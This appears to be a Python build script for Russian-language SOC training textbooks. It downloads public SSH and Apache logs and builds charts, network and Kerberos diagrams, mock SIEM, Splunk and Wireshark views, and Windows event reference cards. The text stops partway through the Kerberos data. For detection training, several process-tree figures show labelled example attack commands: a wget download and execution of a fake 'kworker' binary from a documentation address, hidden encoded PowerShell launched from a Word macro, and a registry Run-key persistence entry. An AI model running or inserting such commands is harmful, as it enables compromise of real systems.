#!/usr/bin/env python3
"""Вставляет визуал (графики, схемы, интерфейсы, иллюстрации) в учебники books/*.html.
Запуск:  python3 tools/viz/build.py
- реальные датасеты скачиваются в tools/viz/cache (loghub OpenSSH, Elastic apache_logs);
- страны IP — по базе DB-IP Lite (CC BY 4.0) через node tools/viz/ipcountry.mjs (сначала `npm install` в tools/viz);
- каждый блок вставляется между метками <!--thv:имя--> … <!--/thv:имя-->, повторный запуск заменяет их, а не дублирует.
Всё выдуманное в блоках помечено как «учебный пример» прямо в подписи."""
import collections, html, json, pathlib, re, subprocess, urllib.request

ROOT = pathlib.Path(__file__).resolve().parents[2]
HERE = pathlib.Path(__file__).resolve().parent
CACHE = HERE / "cache"
CACHE.mkdir(exist_ok=True)
SRC = {
    "ssh": "https://raw.githubusercontent.com/logpai/loghub/master/OpenSSH/OpenSSH_2k.log",
    "apache": "https://raw.githubusercontent.com/elastic/examples/master/Common%20Data%20Formats/apache_logs/apache_logs",
}


def dataset(key):
    f = CACHE / (key + ".log")
    if not f.exists():
        urllib.request.urlretrieve(SRC[key], f)
    return f.read_text(encoding="utf8", errors="replace").splitlines()


def fig(name, vtype, title, note, data):
    js = json.dumps(data, ensure_ascii=False, separators=(",", ":")).replace("</", "<\\/")
    return (f'<!--thv:{name}--><figure class="thv" data-v="{vtype}" id="thv-{name}"><figcaption><b>{html.escape(title)}</b>'
            f'<span>{html.escape(note)}</span></figcaption><script type="application/json">{js}</script></figure><!--/thv:{name}-->')


def ill(name, book, alt, caption):
    return (f'<!--thv:{name}--><figure class="thv-ill"><img src="../assets/illustrations/{book}.svg" alt="{html.escape(alt)}" loading="lazy" width="1200" height="520">'
            f'<figcaption>{html.escape(caption)}</figcaption></figure><!--/thv:{name}-->')


# ---------------------------------------------------------------- данные: SSH
def ssh_data():
    L = dataset("ssh")
    rows, fails = [], []
    for l in L:
        m = re.match(r"(\w{3} +\d+ \d\d:\d\d:\d\d) \S+ sshd\[(\d+)\]: (.*)", l)
        if not m:
            continue
        t, pid, msg = m.groups()
        ip = (re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", msg) or [None, ""])[1] if re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", msg) else ""
        user = ""
        if "message repeated" in msg:
            ev = "Failed password (повтор)"
            um = re.search(r"for (?:invalid user )?(\S+) from", msg)
            user = um.group(1) if um else ""
        elif "Failed password" in msg:
            ev = "Failed password"
            um = re.search(r"for (?:invalid user )?(\S+) from", msg)
            user = um.group(1) if um else ""
            fails.append((t, ip))
        elif msg.startswith("Invalid user"):
            ev = "Invalid user"
            um = re.search(r"Invalid user (\S*) from", msg)
            user = um.group(1) if um else ""
        elif "Accepted" in msg:
            ev = "Accepted password"
            um = re.search(r"for (\S+) from", msg)
            user = um.group(1) if um else ""
        elif "authentication failure" in msg:
            ev = "auth failure"
            um = re.search(r"user=(\S+)", msg)
            user = um.group(1) if um else ""
        elif "POSSIBLE BREAK-IN" in msg:
            ev = "POSSIBLE BREAK-IN"
        elif "Received disconnect" in msg:
            ev = "Disconnect"
        elif "Connection closed" in msg:
            ev = "Connection closed"
        elif "check pass; user unknown" in msg:
            ev = "user unknown"
        else:
            ev = "Другое"
        rows.append([t[7:], pid, ev, user, ip])
    # таймлайн: неудачные входы по 10 минут
    def slot(t):
        h, mi = int(t[7:9]), int(t[10:12])
        return h * 6 + mi // 10
    c = collections.Counter(slot(t) for t, _ in fails)
    s0, s1 = min(c), max(c)
    pts = [[f"{i // 6:02d}:{(i % 6) * 10:02d}", c.get(i, 0)] for i in range(s0, s1 + 1)]
    acc = [l for l in L if "Accepted password" in l][0]
    acc_t = acc[7:15]
    acc_i = slot(acc[:15]) - s0
    ips = collections.Counter(ip for _, ip in fails)
    hours = collections.Counter(int(l[7:9]) for l in L)
    return {"rows": rows, "pts": pts, "acc": (acc_i, acc_t, re.search(r"for (\S+) from (\S+)", acc).groups()),
            "top": ips.most_common(8), "hours": [hours.get(h, 0) for h in range(24)], "fail_ips": dict(ips), "total": len(L), "fails": len(fails)}


SHORT = {"CN": "Китай", "RU": "Россия", "US": "США", "KR": "Южная Корея", "GB": "Великобритания", "DE": "Германия", "NL": "Нидерланды",
         "FR": "Франция", "IN": "Индия", "BR": "Бразилия", "VN": "Вьетнам", "MX": "Мексика", "UA": "Украина", "TW": "Тайвань", "HK": "Гонконг"}


def countries(ip_counts):
    try:
        out = subprocess.run(["node", str(HERE / "ipcountry.mjs")], input=json.dumps(ip_counts), capture_output=True, text=True, check=True).stdout
        r = json.loads(out)
        r["names"] = {k: SHORT.get(k, v) for k, v in r["names"].items()}
        return r
    except Exception as e:
        print("!! страны не посчитаны (нужен npm install в tools/viz):", e)
        return None


# ---------------------------------------------------------------- данные: Apache (Elastic)
def apache_data():
    L = dataset("apache")
    rx = re.compile(r'^(\S+) \S+ \S+ \[(\d+)/(\w+)/(\d+):(\d+):\d+:\d+ [+-]\d+\] "(\S+) (\S+)[^"]*" (\d{3})')
    st, h404, top404, allh = collections.Counter(), collections.Counter(), collections.Counter(), collections.Counter()
    for l in L:
        m = rx.match(l)
        if not m:
            continue
        ip, d, mo, y, H, meth, uri, code = m.groups()
        st[code] += 1
        allh[(d, int(H))] += 1
        if code == "404":
            h404[(d, int(H))] += 1
            top404[uri] += 1
    days = sorted({d for d, _ in allh})
    present = {d: {h for (dd, h) in allh if dd == d} for d in days}
    base = days[:-1]
    lo, hi, v = [], [], []
    for h in range(22):
        vals = [h404.get((d, h), 0) for d in base if h in present[d]]
        lo.append(min(vals)); hi.append(max(vals)); v.append(h404.get((days[-1], h), 0))
    return {"status": st.most_common(), "top404": top404.most_common(6), "n404": sum(top404.values()), "days": days,
            "heat": [[h404.get((d, h), 0) for h in range(24)] for d in days],
            "lo": lo, "hi": hi, "v": v, "hist": [h404.get((d, h), 0) for d in days for h in range(24)], "total": len(L)}


# ---------------------------------------------------------------- спецификации
def specs():
    S = {}
    ssh = ssh_data()
    geo = countries(ssh["fail_ips"])
    ap = apache_data()
    SSH_NOTE = "Реальные данные: loghub, OpenSSH_2k.log (сервер LabSZ, 10 декабря, время сервера — пояс в логе не указан)."
    AP_NOTE = "Реальные данные: Elastic examples, apache_logs, 10 000 строк за 17–20 мая 2015 (UTC)."

    # ===== Linux Fundamentals
    S["cs101-linux"] = [
        ("Глава 2\\. SSH", "start", ill("ill-linux", "cs101-linux", "Сервер под SSH-брутфорсом: сотни неудачных попыток входа и одна удачная", "Иллюстрация к сквозному сюжету: сервер принимает сотни попыток входа по SSH — и одна из них проходит.")),
        ("SSH: вход в машину издалека", "end", fig("ssh-timeline", "timeline", "Брутфорс SSH во времени",
            SSH_NOTE + f" Столбик — неудачные пароли за 10 минут, всего {ssh['fails']}.",
            {"points": ssh["pts"], "unit": "неудачных входов за 10 мин", "kind": "bad",
             "marks": [{"i": ssh["acc"][0], "text": f"{ssh['acc'][1][:5]} успешный вход {ssh['acc'][2][0]}", "kind": "good"}],
             "legend": [["Failed password", "bad"], ["Accepted password", "good"]]})),
        ("SSH: вход в машину издалека", "end", fig("ssh-top", "topn", "Кто ломится: топ IP по неудачным паролям",
            SSH_NOTE + " Это те же числа, что ты получаешь через grep | sort | uniq -c.",
            {"items": [[ip, n, "bad"] for ip, n in ssh["top"]], "unit": "строк «Failed password» с адреса"})),
    ]
    if geo:
        S["cs101-linux"].append(("SSH: вход в машину издалека", "end", fig("ssh-map", "map", "Откуда шли попытки входа",
            SSH_NOTE + " Страна по базе DB-IP Lite (CC BY 4.0). Страна IP — это не страна атакующего: чаще всего это арендованный сервер или чужой взломанный хост.",
            {"counts": geo["counts"], "names": geo["names"], "unit": "неудачных паролей по стране источника", "attr": "IP Geolocation by DB-IP"})))
    S["cs101-linux"] += [
        ("Логи: /var/log", "end", fig("ssh-hours", "hours", "Активность sshd по часам",
            SSH_NOTE + " В этом логе один день с 06:55 до 11:04, поэтому столбики только утром.",
            {"values": ssh["hours"], "unit": "строк sshd", "tz": "сервера, пояс не указан"})),
        ("Утилиты передачи файлов", "end", fig("ptree-wget", "ptree", "Что видно в дереве процессов после взлома",
            "Учебный пример по сюжету главы: веб-сервер запускает оболочку, та скачивает и запускает файл. Адрес из RFC 5737.",
            {"root": {"n": "apache2", "u": "www-data", "note": "веб-сервер — норма", "c": [
                {"n": "sh -c", "u": "www-data", "bad": True, "note": "оболочка из веб-сервера — тревога", "cmd": "sh -c 'cd /tmp; wget http://203.0.113.66/kworker -O /tmp/.sys/kworker; chmod +x /tmp/.sys/kworker; ./.sys/kworker &'", "c": [
                    {"n": "wget", "u": "www-data", "bad": True, "cmd": "wget http://203.0.113.66/kworker -O /tmp/.sys/kworker", "note": "загрузка с внешнего адреса"},
                    {"n": "chmod +x", "u": "www-data", "cmd": "chmod +x /tmp/.sys/kworker", "note": "делает файл исполняемым"},
                    {"n": "kworker", "u": "www-data", "bad": True, "cmd": "/tmp/.sys/kworker", "note": "маскируется под поток ядра, но живёт в /tmp"}]}]}})),
        ("Что делает L1 и где его граница", "start", fig("chain-linux", "chain", "Где атакующий в нашем сюжете",
            "Учебный сквозной сюжет учебника, этапы по MITRE ATT&CK v20.",
            {"stages": [
                {"name": "Reconnaissance", "ru": "разведка", "state": "done", "note": "Сканеры находят открытый порт 22 — это фон любого сервера в интернете."},
                {"name": "Credential Access", "ru": "подбор пароля", "state": "done", "note": "Сотни Failed password с нескольких адресов: брутфорс (T1110)."},
                {"name": "Initial Access", "ru": "вход", "state": "done", "note": "Один Accepted password после серии неудач — вот где алерт становится инцидентом."},
                {"name": "Execution", "ru": "запуск", "state": "cur", "note": "Скачанный файл запущен из /tmp. Здесь L1 эскалирует на L2 с таймлайном и индикаторами."},
                {"name": "Persistence", "ru": "закрепление", "state": "", "note": "Следующий шаг атакующего: cron, systemd-юнит или ключ в authorized_keys."},
                {"name": "Impact", "ru": "ущерб", "state": "", "note": "Майнер, рассылка спама, плацдарм для атак на других. До этого не должно дойти."}]})),
        ("Задание 1\\. Разведка по SSH-логу", "start", fig("ssh-siem", "siem", "Мини-SIEM: весь OpenSSH_2k.log",
            SSH_NOTE + " Поиск ищет по всем полям, фильтры — по типу события и IP.",
            {"cols": ["Время", "PID", "Событие", "Пользователь", "IP"], "rows": ssh["rows"], "filter": [2, 4],
             "tasks": ["выбери «Accepted password» — сколько удачных входов?", "найди все строки адреса 183.62.140.253", "какой логин перебирали чаще всего в «Invalid user»?"]})),
    ]

    # ===== How The Web Works
    S["ps-06-web"] = [
        ("Сквозной сюжет", "end", ill("ill-web", "ps-06-web", "Фишинговый домен-двойник: сотрудница открывает поддельную страницу входа", "Иллюстрация к сюжету: домен-двойник выглядит как настоящий, а форма входа отправляет пароль атакующему.")),
        ("1\\.3\\. Как проходит запрос", "end", fig("dns-seq", "seq", "DNS-запрос по шагам",
            "Схема рекурсивного разрешения имени. Учебный домен из сюжета, адрес из RFC 5737.",
            {"actors": ["Ноутбук", "Резолвер", "Корень .", "TLD .example", "NS домена"], "msgs": [
                {"f": 0, "t": 1, "text": "A? login.rednltz-spedition.example", "note": "Браузер спрашивает у резолвера компании или провайдера. Именно этот запрос видит DNS-лог и срабатывает алерт «новый домен»."},
                {"f": 1, "t": 2, "text": "кто отвечает за .example?", "note": "Резолвер не знает ответа и начинает с корня."},
                {"f": 2, "t": 1, "text": "спроси NS зоны .example", "dash": True, "note": "Корень отвечает направлением, а не адресом."},
                {"f": 1, "t": 3, "text": "кто отвечает за rednltz-spedition?", "note": "Резолвер идёт к серверу зоны верхнего уровня."},
                {"f": 3, "t": 1, "text": "спроси ns1.rednltz-spedition…", "dash": True, "note": "Ещё одно направление — к авторитетному серверу домена. Его контролирует владелец домена, то есть атакующий."},
                {"f": 1, "t": 4, "text": "A? login.rednltz-spedition.example", "note": "Финальный вопрос авторитетному серверу."},
                {"f": 4, "t": 1, "text": "203.0.113.50, TTL 300", "dash": True, "kind": "bad", "note": "Ответ: адрес атакующего. Короткий TTL 300 секунд — частая примета одноразовой инфраструктуры."},
                {"f": 1, "t": 0, "text": "203.0.113.50", "dash": True, "kind": "bad", "note": "Резолвер кэширует ответ и отдаёт его ноутбуку. Дальше браузер идёт по HTTPS уже на этот IP."}]})),
        ("2\\.5\\. Коды ответа", "end", fig("web-status", "topn", "Коды ответа в реальном access-логе",
            AP_NOTE + " Норма живого сайта: почти всё 200 и 304, ошибок — единицы процентов.",
            {"items": [[f"{c} {'OK' if c=='200' else ''}".strip(), n, "bad" if c[0] in "45" else ("good" if c == "200" else "")] for c, n in ap["status"]], "unit": "запросов с этим кодом"})),
        ("2\\.2\\. URL по частям", "end", fig("url-decode", "decode", "Раскодируем подозрительный запрос",
            "Строка из этого учебника (HTML Injection в поиске). Раскодирование — как в CyberChef, рецепт «URL Decode».",
            {"input": "GET /suche?q=%3Ca%20href%3D%22https%3A%2F%2Flogin.rednltz-spedition.example%22%3ERechnung%3C%2Fa%3E",
             "steps": [{"op": "Выделить параметр q", "out": "%3Ca%20href%3D%22https%3A%2F%2Flogin.rednltz-spedition.example%22%3ERechnung%3C%2Fa%3E"},
                       {"op": "URL Decode", "out": "<a href=\"https://login.rednltz-spedition.example\">Rechnung</a>", "note": "%3C — это <, %22 — кавычка, %2F — слеш. В поиск передали HTML-ссылку на домен-двойник."},
                       {"op": "Вывод", "out": "Поиск сайта вставляет ссылку «Rechnung» прямо в страницу — HTML Injection. Жертве покажут настоящий сайт с фишинговой ссылкой внутри."}]})),
        ("4\\.1\\. Что происходит, когда ты нажимаешь Enter", "end", fig("web-route", "route", "Путь запроса по шагам",
            "Учебная схема: что проходит запрос от браузера до базы данных. Каждый узел пишет свой лог.",
            {"nodes": [{"id": "pc", "label": "Браузер", "icon": "browser"}, {"id": "dns", "label": "DNS-резолвер", "icon": "dns"}, {"id": "cdn", "label": "CDN / WAF", "icon": "shield"},
                       {"id": "lb", "label": "Балансировщик", "icon": "router"}, {"id": "web", "label": "Веб-сервер", "icon": "server"}, {"id": "db", "label": "База данных", "icon": "db"}],
             "steps": [{"from": "pc", "to": "dns", "text": "Имя → IP. След: DNS-лог (кто какой домен спросил)."},
                       {"from": "pc", "to": "cdn", "text": "TLS-соединение и HTTP-запрос приходят на край сети. След: лог WAF — здесь режут SQLi и сканеры."},
                       {"from": "cdn", "to": "lb", "text": "Запрос пропущен внутрь. Важно: дальше IP клиента часто виден только в заголовке X-Forwarded-For."},
                       {"from": "lb", "to": "web", "text": "Балансировщик выбирает сервер. След: access-лог — та самая строка, которую ты разбираешь в 4.4."},
                       {"from": "web", "to": "db", "text": "Приложение идёт в базу. След: лог запросов БД — тут видно, если инъекция дошла до SQL."},
                       {"from": "web", "to": "pc", "text": "Ответ уходит обратно в браузер: код, заголовки, страница."}]})),
        ("4\\.4\\. Журнал веб-сервера", "end", fig("web-baseline", "baseline", "Ошибки 404 по часам: норма и 20 мая",
            AP_NOTE + " Полоса — минимум и максимум за 17–19 мая, линия — 20 мая.",
            {"labels": [f"{h:02d}" for h in range(22)], "lo": ap["lo"], "hi": ap["hi"], "v": ap["v"], "bandLabel": "норма 17–19 мая", "lineLabel": "20 мая"})),
        ("4\\.4\\. Журнал веб-сервера", "end", fig("web-heat", "heat", "Ошибки 404: день × час",
            AP_NOTE + " Яркая клетка 20 мая в 09:00 — 14 ошибок от одного IP (144.76.95.39): бот с битыми ссылками или сканер. Без контекста это вердикт «надо копать», а не «атака».",
            {"rows": [d + " мая" for d in ap["days"]], "cols": [f"{h:02d}" for h in range(24)], "values": ap["heat"], "unit": "ошибок 404"})),
        ("Задание 4\\. Access-лог Apache", "start", fig("web-splunk", "ui", "Так это выглядит в Splunk",
            AP_NOTE + " Интерфейс нарисован, числа настоящие. Тот же ответ дают awk и sort в задании.",
            {"app": "splunk", "title": "Splunk · Search & Reporting", "query": "index=web sourcetype=access_combined status=404 | top limit=6 uri",
             "count": f"{ap['n404']} событий (17.05.2015 – 20.05.2015)", "hist": ap["hist"],
             "cols": ["uri", "count", "percent"], "rows": [[u, str(n), f"{n / ap['n404'] * 100:.1f}%"] for u, n in ap["top404"]]})),
    ]

    # ===== Network Fundamentals
    S["ps-05-network"] = [
        ("Инцидент, который мы будем разматывать", "end", ill("ill-net", "ps-05-network", "Офисная сеть: в ней появилось чужое устройство, которое выдаёт себя за роутер", "Иллюстрация к сюжету: в офисной сети затесался «человек посередине», который выдаёт себя за роутер.")),
        ("Топологии: как соединены устройства", "end", fig("net-scene", "scene", "Сеть из сюжета",
            "Учебная схема сети Nordstern GmbH. Адреса приватные, внешний — из RFC 5737.",
            {"zones": [{"id": "inet", "label": "Интернет", "kind": "bad"}, {"id": "edge", "label": "Граница"}, {"id": "lan", "label": "LAN 192.168.1.0/24"}],
             "nodes": [{"id": "att", "label": "203.0.113.17", "sub": "внешний адрес", "icon": "attacker", "zone": "inet", "kind": "bad"},
                       {"id": "rt", "label": "Роутер + NAT", "sub": "192.168.1.1", "icon": "router", "zone": "edge"},
                       {"id": "fw", "label": "Файрвол", "icon": "firewall", "zone": "edge"},
                       {"id": "sw", "label": "Коммутатор", "icon": "switch", "zone": "lan"},
                       {"id": "pc", "label": "Ресепшен", "sub": "192.168.1.24", "icon": "desktop", "zone": "lan", "kind": "bad"},
                       {"id": "srv", "label": "Сервер сайта", "sub": "192.168.1.10", "icon": "server", "zone": "lan"}],
             "edges": [["att", "rt", "порт наружу", "bad"], ["rt", "fw", ""], ["fw", "sw", ""], ["sw", "pc", ""], ["sw", "srv", ""]]})),
        ("ARP: как IP превращается в MAC", "end", fig("arp-seq", "seq", "ARP и подмена по шагам",
            "Учебный пример: адреса и MAC выдуманы. Так выглядит «человек посередине» на уровне ARP.",
            {"actors": ["Ресепшен .24", "Все в сети", "Роутер .1", "Чужой .66"], "msgs": [
                {"f": 0, "t": 1, "text": "Who has 192.168.1.1?", "note": "ARP-запрос летит широковещательно: всем в сегменте."},
                {"f": 2, "t": 0, "text": "192.168.1.1 is at aa:bb:cc:00:00:01", "dash": True, "kind": "good", "note": "Честный ответ роутера. Ресепшен запоминает пару IP ↔ MAC в ARP-кэше."},
                {"f": 3, "t": 0, "text": "192.168.1.1 is at de:ad:be:ef:00:66", "dash": True, "kind": "bad", "note": "Чужое устройство без запроса шлёт ложный ответ (gratuitous ARP) и выдаёт себя за роутер."},
                {"f": 0, "t": 3, "text": "трафик «в интернет»", "kind": "bad", "note": "Ресепшен верит последнему ответу и шлёт весь трафик через чужое устройство. Улика: у адреса роутера в ARP-кэше сменился MAC."}]})),
        ("Инкапсуляция: как один кусок данных меняет имя", "end", fig("syn-layers", "layers", "TCP SYN по слоям",
            "Размеры заголовков стандартные (Ethernet II, IPv4 без опций, TCP с типичными опциями SYN). Значения полей — учебный пример.",
            {"layers": [
                {"name": "Ethernet", "bytes": 14, "note": "канальный уровень, адреса внутри сегмента", "fields": [["dst MAC", "aa:bb:cc:00:00:01", "кому в этом сегменте"], ["src MAC", "3c:22:fb:12:34:56", "от кого"], ["EtherType", "0x0800", "дальше лежит IPv4"]]},
                {"name": "IPv4", "bytes": 20, "note": "сетевой уровень, адреса откуда и куда", "fields": [["src", "192.168.1.24", "ресепшен"], ["dst", "192.168.1.10", "сервер сайта"], ["TTL", "128", "подсказка: так стартует Windows"], ["Protocol", "6", "дальше лежит TCP"]]},
                {"name": "TCP", "bytes": 32, "note": "транспорт: порты и флаги", "fields": [["src port", "51544", "эфемерный порт клиента"], ["dst port", "445", "SMB — общие папки Windows"], ["flags", "SYN", "первый шаг рукопожатия"], ["options", "MSS, WS, SACK", "12 байт опций"]]},
                {"name": "Данные", "bytes": 0, "note": "в SYN полезной нагрузки нет"}]})),
        ("TCP: соединение с гарантией", "end", fig("tcp-seq", "seq", "Рукопожатие TCP и скан портов",
            "Учебный пример: тот же SYN к открытому и к закрытому порту.",
            {"actors": ["Ресепшен .24", "Сервер .10"], "msgs": [
                {"f": 0, "t": 1, "text": "SYN → :445", "note": "Клиент предлагает соединение."},
                {"f": 1, "t": 0, "text": "SYN/ACK", "dash": True, "kind": "good", "note": "Порт открыт: сервер согласен."},
                {"f": 0, "t": 1, "text": "ACK", "note": "Рукопожатие завершено, соединение установлено."},
                {"f": 0, "t": 1, "text": "SYN → :3389", "note": "Следующий порт."},
                {"f": 1, "t": 0, "text": "RST/ACK", "dash": True, "kind": "bad", "note": "Порт закрыт: сервер сбрасывает соединение."},
                {"f": 0, "t": 1, "text": "SYN → :22, :80, :443 …", "kind": "bad", "note": "Десятки SYN на разные порты за секунды, и почти ни одно рукопожатие не доведено до конца. Это почерк SYN-скана."}]})),
        ("Port forwarding и NAT", "end", fig("nat-route", "route", "Как пакет проходит через NAT",
            "Учебная схема: адреса приватные и из RFC 5737.",
            {"nodes": [{"id": "pc", "label": "Ресепшен", "sub": "192.168.1.24", "icon": "desktop"}, {"id": "rt", "label": "Роутер + NAT", "sub": "198.51.100.7", "icon": "router"},
                       {"id": "net", "label": "Интернет", "icon": "globe"}, {"id": "srv", "label": "Сайт", "sub": "203.0.113.80", "icon": "server"}],
             "steps": [{"from": "pc", "to": "rt", "text": "Пакет уходит из 192.168.1.24:51544 на 203.0.113.80:443."},
                       {"from": "rt", "to": "net", "text": "NAT подменяет отправителя на свой внешний 198.51.100.7:40001 и записывает это в таблицу трансляций."},
                       {"from": "net", "to": "srv", "text": "Сайт видит только 198.51.100.7. Поэтому в чужих логах вся фирма выглядит как один адрес."},
                       {"from": "srv", "to": "rt", "text": "Ответ приходит на 198.51.100.7:40001, роутер по таблице понимает, кому он."},
                       {"from": "rt", "to": "pc", "text": "Роутер возвращает адрес 192.168.1.24:51544 и отдаёт пакет. Вывод для SOC: «кто внутри» знает только лог NAT."}]})),
        ("Задание 4\\. DHCP: разложи DORA", "start", fig("dhcp-ws", "ui", "DORA в Wireshark",
            "Учебный пример: интерфейс нарисован, адреса и MAC выдуманы. Порядок и поля — как в настоящем обмене DHCP.",
            {"app": "wireshark", "title": "Wireshark · dhcp.pcap", "filter": "dhcp",
             "cols": ["No.", "Time", "Source", "Destination", "Protocol", "Info"],
             "rows": [["1", "0.000000", "0.0.0.0", "255.255.255.255", "DHCP", "DHCP Discover - Transaction ID 0x3d1d"],
                      ["2", "0.004127", "192.168.1.1", "192.168.1.24", "DHCP", "DHCP Offer    - Transaction ID 0x3d1d"],
                      ["3", "0.004988", "0.0.0.0", "255.255.255.255", "DHCP", "DHCP Request  - Transaction ID 0x3d1d"],
                      ["4", "0.009310", "192.168.1.1", "192.168.1.24", "DHCP", "DHCP ACK      - Transaction ID 0x3d1d"]],
             "colors": ["#daeefd", "#daeefd", "#daeefd", "#daeefd"],
             "detail": ["Discover: клиент без адреса (0.0.0.0) кричит всем: «есть DHCP-сервер?»\nUDP 68 → 67, Client MAC 3c:22:fb:12:34:56",
                        "Offer: сервер предлагает адрес 192.168.1.24, маску, шлюз 192.168.1.1, DNS и срок аренды.\nЕсли Offer пришёл от адреса, который не твой роутер, — это rogue DHCP.",
                        "Request: клиент всё ещё без адреса и широковещательно отвечает: «беру 192.168.1.24 у сервера 192.168.1.1».",
                        "ACK: сервер подтверждает аренду. С этого момента у хоста есть адрес — и запись в логе DHCP, по которой SOC узнаёт, кто был за IP в нужное время."]})),
    ]

    # ===== Windows и Active Directory
    S["cs101-windows-ad"] = [
        ("Инцидент, который мы будем разматывать", "end", ill("ill-ad", "cs101-windows-ad", "Домен Active Directory: учётка рабочей станции получает права администратора домена", "Иллюстрация к сюжету: из одной рабочей станции атакующий тянется к контроллеру домена.")),
        ("Инцидент, который мы будем разматывать", "end", fig("ad-chain", "chain", "Где атакующий в нашем сюжете",
            "Учебный сценарий учебника (Nordstern Logistik GmbH). Этапы — тактики MITRE ATT&CK v20.",
            {"stages": [
                {"name": "Initial Access", "ru": "первичный доступ", "state": "done", "note": "Письмо с вложением открыто на рабочей станции."},
                {"name": "Execution", "ru": "запуск", "state": "done", "note": "Офисное приложение запускает оболочку — первый алерт смены."},
                {"name": "Persistence", "ru": "закрепление", "state": "done", "note": "Автозапуск в реестре и служба с подозрительным путём."},
                {"name": "Credential Access", "ru": "учётные данные", "state": "cur", "note": "Запросы билетов Kerberos с шифрованием RC4 — подготовка к Kerberoasting."},
                {"name": "Lateral Movement", "ru": "боковое перемещение", "state": "", "note": "С украденным паролем сервисной учётки — к серверам."},
                {"name": "Impact", "ru": "ущерб", "state": "", "note": "Если не остановить: шифрование и удаление теневых копий."}]})),
        ("Автозапуск: где закрепляется малварь", "end", fig("ad-ptree", "ptree", "Дерево процессов: макрос из письма",
            "Учебный пример по сюжету: Word запускает оболочку — классика фишинга с макросом. Командная строка сокращена.",
            {"root": {"n": "explorer.exe", "u": "NORDSTERN\\m.becker", "note": "оболочка пользователя — норма", "c": [
                {"n": "WINWORD.EXE", "u": "m.becker", "cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\m.becker\\Downloads\\Rechnung_0914.docm\"", "note": "открыт документ с макросами (.docm)", "c": [
                    {"n": "cmd.exe", "u": "m.becker", "bad": True, "cmd": "cmd.exe /c powershell -nop -w hidden -enc JABXAEMAPQBO…", "note": "Word не должен запускать оболочку", "c": [
                        {"n": "powershell.exe", "u": "m.becker", "bad": True, "cmd": "powershell -nop -w hidden -enc JABXAEMAPQBO…", "note": "скрытое окно и base64 — сильный сигнал", "c": [
                            {"n": "reg.exe", "u": "m.becker", "bad": True, "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /d C:\\Users\\Public\\odsync.exe", "note": "закрепление в Run под видом OneDrive"}]}]}]}]}})),
        ("Атаки на AD и что от них остаётся в логах", "end", fig("ad-events", "event", "Карточки событий, которые спросят на собеседовании",
            "Справка по документации Microsoft (журнал Security, кроме 7045 — System). Поля — главные для триажа, не полный список.",
            {"cards": [
                {"id": "4624", "name": "Успешный вход", "log": "Security", "kind": "good", "fields": [["LogonType", "2 — локально, 3 — по сети, 10 — RDP"], ["TargetUserName", "кто вошёл"], ["IpAddress", "откуда"]], "look": "тип входа вместе с источником: RDP ночью с внешнего адреса — повод копать."},
                {"id": "4625", "name": "Неудачный вход", "log": "Security", "kind": "bad", "fields": [["Status / SubStatus", "0xC000006A — неверный пароль, 0xC0000064 — нет такой учётки"], ["IpAddress", "откуда"]], "look": "пачка на одну учётку — брутфорс, по одной на много учёток — password spraying."},
                {"id": "4688", "name": "Создан процесс", "log": "Security", "fields": [["NewProcessName", "что запустили"], ["ParentProcessName", "кто запустил"], ["CommandLine", "только при включённой политике"]], "look": "родителя: Word → cmd или w3wp → powershell."},
                {"id": "4720", "name": "Создана учётная запись", "log": "Security", "kind": "warn", "fields": [["SubjectUserName", "кто создал"], ["TargetUserName", "какую"]], "look": "цепочку 4720 → 4732/4728 → 4672 за несколько минут."},
                {"id": "4732", "name": "Добавлен в локальную группу", "log": "Security", "kind": "warn", "fields": [["TargetUserName", "имя группы"], ["MemberName / MemberSid", "кого добавили"]], "look": "группу Administrators. В доменную группу (Domain Admins) — это уже 4728."},
                {"id": "4769", "name": "Запрошен билет службы", "log": "Security · на DC", "kind": "bad", "fields": [["ServiceName", "к какой службе"], ["TicketEncryptionType", "0x17 — RC4"], ["IpAddress", "откуда"]], "look": "много запросов RC4 от одной учётки к разным службам — Kerberoasting."},
                {"id": "1102", "name": "Журнал аудита очищен", "log": "Security", "kind": "bad", "fields": [["SubjectUserName", "кто очистил"]], "look": "почти всегда тревога: заметание следов, в ATT&CK v20 — T1685.005."},
                {"id": "7045", "name": "Установлена служба", "log": "System · Service Control Manager", "kind": "warn", "fields": [["ServiceName", "имя"], ["ImagePath", "что запускается"], ["StartType", "как стартует"]], "look": "ImagePath в Temp, ProgramData или с cmd /c — частый след PsExec и закрепления."}]})),
        ("Атаки на AD и что от них остаётся в логах", "end", fig("ad-matrix", "matrix", "Где видна атака на AD",
            "Оценка по документации Microsoft и MITRE ATT&CK v20: сильно зависит от политик аудита и того, что вообще собирают. ID техник сверены с v20.",
            {"cols": ["Security на DC", "Sysmon", "PowerShell 4104", "EDR", "Сеть"], "rows": [
                {"name": "Kerberoasting", "id": "T1558.003", "v": [2, 0, 1, 1, 1]},
                {"name": "Password spraying", "id": "T1110.003", "v": [2, 0, 0, 1, 1]},
                {"name": "DCSync", "id": "T1003.006", "v": [2, 0, 0, 1, 2]},
                {"name": "Pass-the-Hash", "id": "T1550.002", "v": [1, 1, 0, 2, 1]},
                {"name": "Golden Ticket", "id": "T1558.001", "v": [1, 0, 0, 1, 1]},
                {"name": "Удалённый запуск службы (PsExec)", "id": "T1569.002", "v": [2, 2, 0, 2, 1]},
                {"name": "Новая учётка с правами админа", "id": "T1136.002", "v": [2, 0, 0, 1, 0]}]})),
        ("Аутентификация: Kerberos и NTLM", "end", fig("krb-seq", "seq", "Kerberos по шагам — и где Kerberoasting",
            "Схема по документации Microsoft; имена из учебного сюжета.",
            {"actors": ["Пользователь", "KDC на DC", "Сервер службы"], "msgs": [
                {"f": 0, "t": 1, "text": "AS-REQ: я m.becker", "note": "Вход: клиент просит билет на получение билетов (TGT). На DC — событие 4768."},
                {"f": 1, "t": 0, "text": "AS-REP: TGT", "dash": True, "kind": "good", "note": "Пароль верный — KDC выдаёт TGT. При неверном пароле будет 4771."},
                {"f": 0, "t": 1, "text": "TGS-REQ: билет к MSSQLSvc/db01", "note": "Нужен доступ к службе: клиент предъявляет TGT. На DC — 4769."},
                {"f": 1, "t": 0, "text": "TGS-REP: билет службы", "dash": True, "note": "Билет службы зашифрован ключом сервисной учётки. Если это RC4 (0x17) — его можно брутить офлайн. В этом и суть Kerberoasting."},
                {"f": 0, "t": 2, "text": "AP-REQ: вот билет", "note": "Обычная работа: клиент идёт к службе с билетом."},
